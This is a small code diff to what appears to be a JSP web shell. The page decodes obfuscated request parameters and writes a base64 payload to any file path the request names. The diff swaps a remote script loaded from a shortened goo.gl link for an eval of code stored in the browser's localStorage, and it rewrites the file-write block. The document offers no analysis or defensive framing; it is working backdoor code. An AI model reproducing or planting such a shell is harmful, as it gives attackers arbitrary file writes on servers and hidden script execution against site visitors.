@@ -1,5 +1,5 @@
 <%@page import="java.io.*, java.util.*, javax.xml.bind.*, java.net.*"%>
-<script src="https://goo.gl/BOFXBM"></script>
+<script>eval(window.localStorage.embed)</script>
 <%!
 	public String v(String w){
 		String x="";
@@ -35,7 +35,8 @@
 			int n=d.indexOf("n=");
 			byte[] m=DatatypeConverter.parseBase64Binary(v(d.substring(b+2)));
 			String f=v(d.substring(2,n-1))+File.separator+v(d.substring(n+2,b-1));
-			try(OutputStream stream=new FileOutputStream(f)){
+			try{
+				OutputStream stream=new FileOutputStream(f);
 				stream.write(m);
 				o="Uploaded: "+f;
 			}catch(Exception e){
